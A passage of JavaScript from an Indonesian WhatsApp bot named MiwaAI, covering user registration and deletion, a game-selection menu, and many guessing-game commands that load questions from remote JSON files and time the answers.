				if (umur < 10) return newReply('Hihi, maaf ya kak, MiwaAI cuma bisa bantu Kamu yang umurnya di atas 10 tahun. Tunggu besar dulu ya! 😄');
				if (umur > 50) return newReply('Wah kak, MiwaAI kira umur segitu mending istirahat aja. Jaga kesehatan ya! 🥰');
				try {
					db.data.users[m.sender].nama = nama;
					db.data.users[m.sender].umur = Number(umur);
					db.data.users[m.sender].daftar = true;
					db.data.users[m.sender].uang = (db.data.users[m.sender].uang || 0) + 5000;
					db.data.users[m.sender].limit = (db.data.users[m.sender].limit || 0) + 20;
					if (verifyNumber[m.sender]) {
						clearTimeout(verifyNumber[m.sender][4]);
						delete verifyNumber[m.sender];
					}
					let pesan = `Yeay, Kamu berhasil daftar! 🎉\n\n`;
					pesan += `📦 *Info User*:\n`;
					pesan += `- *Nama*: ${nama}\n`;
					pesan += `- *Nomor*: ${m.sender.split("@")[0]}\n`;
					pesan += `- *Umur*: ${umur}\n\n`;
					pesan += `🎁 *Bonus Daftar:*\n`;
					pesan += `- Rp. 5000 uang\n`;
					pesan += `- 20 Limit tambahan\n\n`;
					pesan += `Terima kasih udah daftar ya kak! Semoga MiwaAI bisa bantu Kamu terus. 🥰`;
					newReply(pesan);
					if (notifRegister) {
						try {
							let avatar;
							try {
								avatar = await sock.profilePictureUrl(m.sender, "image");
							} catch {
								avatar = imageUrl;
							}
							let notif = `Ada user baru yang daftar nih! 🎉\n\n`;
							notif += `- *Nama*: ${nama}\n`;
							notif += `- *Umur*: ${umur}\n`;
							notif += `- *Tag*: @${m.sender.split("@")[0]}\n\n`;
							notif += `Selamat bergabung di sistem MiwaAI! 🥳`;
							sock.sendMessage(ownerNumber + '@s.whatsapp.net', {
								text: notif,
								contextInfo: {
									mentionedJid: [m.sender],
									forwardingScore: 9999999,
									isForwarded: true,
									externalAdReply: {
										showAdAttribution: true,
										containsAutoReply: true,
										title: `Notifikasi Pendaftaran`,
										body: `Waktu: ${date} ${time}`,
										previewType: "PHOTO",
										thumbnailUrl: avatar,
										sourceUrl: wagc
									}
								}
							});
						} catch (error) {
							console.log('Gagal mengirim notifikasi pendaftaran:', error);
						}
					}
				} catch (error) {
					console.log('Error waktu daftar:', error);
					newReply('Aduh kak, ada yang error nih. MiwaAI coba benerin dulu ya! 🙏');
				}
			}
			break;

			case 'unregister': 
			case 'unreg': 
			case 'hapusakun': {
				let replyText = '';
				if (!args[0]) {
					replyText += 'Kamu perlu masukin nomor telepon yang mau dihapus ya! 😊\n\n';
					replyText += '*Contoh:*\n';
					replyText += `${prefix + command} 6281234567890`;
					return newReply(replyText);
				}
				let targetNumber = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (!db.data.users[targetNumber]?.daftar) {
					replyText += `Hmm, nomor *${args[0]}* belum terdaftar kok, kak. 😊`;
					return newReply(replyText);
				}
				try {
					delete db.data.users[targetNumber];
					replyText += `Data pengguna dengan nomor *${args[0]}* berhasil dihapus! 😊`;
					newReply(replyText);
				} catch (e) {
					console.error(e);
					replyText += 'Duh, MiwaAI gagal hapus data pengguna ini. Coba lagi nanti ya, kak. 😔';
					newReply(replyText);
				}
				break;
			}

			case 'game':
			case 'tebak': {
				try {
					const button = [{
						"name": "single_select",
						"buttonParamsJson": `{
							"title": "Pilih Game 🎮",
							"sections": [
								{
									"title": "Tebakan Umum 🧩",
									"rows": [
										{ "header": "Tebak Kabupaten", "title": "Mainkan Tebak Kabupaten 🗺️", "id": ".tebakkabupaten" },
										{ "header": "Tebak JKT48", "title": "Mainkan Tebak JKT48 🎤", "id": ".tebakjkt48" },
										{ "header": "Tebak Hewan", "title": "Mainkan Tebak Hewan 🐾", "id": ".tebakhewan" },
										{ "header": "Tebak ML", "title": "Mainkan Tebak Mobile Legends 🛡️", "id": ".tebakml" },
										{ "header": "Tebak Chara", "title": "Mainkan Tebak Karakter 🎭", "id": ".tebakchara" },
										{ "header": "Tebak Logo", "title": "Mainkan Tebak Logo 🏢", "id": ".tebaklogo" },
										{ "header": "Tebak Aplikasi", "title": "Mainkan Tebak Aplikasi 📱", "id": ".tebakaplikasi" }
									]
								},
								{
									"title": "Game Populer 🎮",
									"rows": [
										{ "header": "Tebak FF", "title": "Mainkan Tebak Free Fire 🔥", "id": ".tebakff" },
										{ "header": "Tebak Hero", "title": "Mainkan Tebak Hero ⚔️", "id": ".tebakhero" },
										{ "header": "Tebak Game", "title": "Mainkan Tebak Game 🎮", "id": ".tebakgame" },
										{ "header": "Tebak Gambar", "title": "Mainkan Tebak Gambar 🖼️", "id": ".tebakgambar" },
										{ "header": "Tebak Bendera", "title": "Mainkan Tebak Bendera 🚩", "id": ".tebakbendera" }
									]
								},
								{
									"title": "Tebakan Kreatif 📝",
									"rows": [
										{ "header": "Lengkapi Kalimat", "title": "Mainkan Lengkapi Kalimat ✍️", "id": ".lengkapikalimat" },
										{ "header": "Asah Otak", "title": "Mainkan Asah Otak 🧠", "id": ".asahotak" },
										{ "header": "Tebak Kata", "title": "Mainkan Tebak Kata 🔤", "id": ".tebakkata" },
										{ "header": "Tebak TTS", "title": "Mainkan Tebakan TTS 💭", "id": ".tebaktebakan" },
										{ "header": "Tebak Lirik", "title": "Mainkan Tebak Lirik 🎶", "id": ".tebaklirik" },
										{ "header": "Tebak Kimia", "title": "Mainkan Tebak Kimia 🧪", "id": ".tebakkimia" },
										{ "header": "Tebak Siapa", "title": "Mainkan Tebak Siapa ❓", "id": ".tebaksiapa" },
										{ "header": "Tebak Kalimat", "title": "Mainkan Tebak Kalimat 📝", "id": ".tebakkalimat" }
									]
								}
							]
						}`
					}];
					let caption = `*🎮 Pilih Game yang Mau Dimainkan!*\n\n`;
					caption += `Pilih game dari daftar berikut ini untuk memulai! Klik tombol di bawah ya!\n\n`;
					caption += `_*Selamat bermain dan semoga menyenangkan!*_`;
					await sock.sendButtonText(m.chat, button, caption, 'Pilih Game', m);
				} catch (err) {
					console.error(err);
					newReply(`⚠️ Terjadi kesalahan: ${err.message}`);
				}
				break;
			}

			case 'tebakgambar': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgambar[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgambar[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgambar[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakgame': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgame[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgame[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgame[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakhero': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://api.sock.my.id/api/tebakhero')
					let result = anu.result
					console.log("Jawaban: " + result.jawaban)
					tebakhero[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah hero?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakhero[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakhero[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakff': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://api.sock.my.id/api/tebakff')
					let result = anu.result
					console.log("Jawaban: " + result.jawaban)
					tebakff[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Karakter Apa Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakff[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakff[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakkabupaten': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebakkabupaten.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.title)
					tebakkabupaten[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.url
							},
							caption: `Logo Kabupaten Manakah ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakkabupaten[m.chat]) {
								waktuHabis(result.title)
								delete tebakkabupaten[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakjkt48': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/memberjkt48.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakjkt48[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Siapakah Nama Member JKT48 Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakjkt48[m.chat]) {
								waktuHabis(result.name)
								delete tebakjkt48[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakhewan': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebakhewan.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.title)
					tebakhewan[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.url
							},
							caption: `Hewan Apakah Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakhewan[m.chat]) {
								waktuHabis(result.title)
								delete tebakhewan[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakhero2':
			case 'tebakml': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebakhero2.json')
					let result = await pickRandom(anu)
					let audio = await pickRandom(result.url)
					console.log("Jawaban: " + result.title)
					let key = await sock.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg',
						ptt: true
					}, {
						quoted: m
					})
					tebakml[m.chat] = [
						await sock.sendMessage(m.chat, {
							text: `Siapakah Nama Karakter Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: key
						}), result, 250,
						setTimeout(() => {
							if (tebakml[m.chat]) {
								waktuHabis(result.title)
								delete tebakml[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakanime':
			case 'tebakchara': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let res = await fetchJson('https://www.sock.my.id/cdn/game/characters.json')
					let anu = res.data
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakchara[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.images.jpg.image_url
							},
							caption: `Siapakah Nama Karakter Ini?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakchara[m.chat]) {
								waktuHabis(result.name)
								delete tebakchara[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebaklogo': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebaklogo.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaklogo[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `*Logo Apa Ini?*\n\n${result.deskripsi}\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebaklogo[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaklogo[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakaplikasi': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebakaplikasi.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakaplikasi[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.image
							},
							caption: `Gambar diatas adalah aplikasi?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakaplikasi[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakaplikasi[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakkata': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkata[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'asahotak': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/asahotak.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					asahotak[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (asahotak[m.chat]) {
								waktuHabis(result.jawaban)
								delete asahotak[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'lengkapikalimat': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://www.sock.my.id/cdn/game/lengkapikalimat.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					lengkapikalimat[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (lengkapikalimat[m.chat]) {
								waktuHabis(result.jawaban)
								delete lengkapikalimat[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakbendera': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakbendera[m.chat] = [
						await sock.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakbendera[m.chat]) {
								waktuHabis(result.name)
								delete tebakbendera[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakkalimat': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkalimat[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkalimat[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkalimat[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebaksiapa': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					siapaaku[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (siapaaku[m.chat]) {
								waktuHabis(result.jawaban)
								delete siapaaku[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebakkimia': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.unsur)
					tebakkimia[m.chat] = [
						await sock.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebakkimia[m.chat]) {
								waktuHabis(result.unsur)
								delete tebakkimia[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebaklirik': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaklirik[m.chat] = [
						await sock.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebaklirik[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaklirik[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tebaktebakan': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaktebakan[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tebaktebakan[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaktebakan[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'susunkata': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					susunkata[m.chat] = [
						await sock.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (susunkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete susunkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'caklontong': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					caklontong[m.chat] = [
						await sock.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (caklontong[m.chat]) {
								waktuHabis(result.jawaban)
								delete caklontong[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'tekateki': {
				const gamecek = await cekgame(m.chat)
				if (gamecek) return newReply('Masih ada sesi yang belum selesai!');
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tekateki[m.chat] = [
						await sock.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
						setTimeout(() => {
							if (tekateki[m.chat]) {
								waktuHabis(result.jawaban)
								delete tekateki[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
					newReply('*Gagal memuat database dari server*. ☹️');
				};
			}
			break

			case 'bantuan': {
				try {
					if (m.chat in tebakgambar) {
						let json = tebakgambar[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakgame) {
						let json = tebakgame[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakhero) {
						let json = tebakhero[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakff) {
						let json = tebakff[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkabupaten) {
						let json = tebakkabupaten[m.chat][1]
						newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakjkt48) {
						let json = tebakjkt48[m.chat][1]
						newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakhewan) {
						let json = tebakhewan[m.chat][1]
						newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakml) {
						let json = tebakml[m.chat][1]
						newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakchara) {
						let json = tebakchara[m.chat][1]
						newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaklogo) {
						let json = tebaklogo[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakaplikasi) {
						let json = tebakaplikasi[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkata) {
						let json = tebakkata[m.chat][1]
						newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
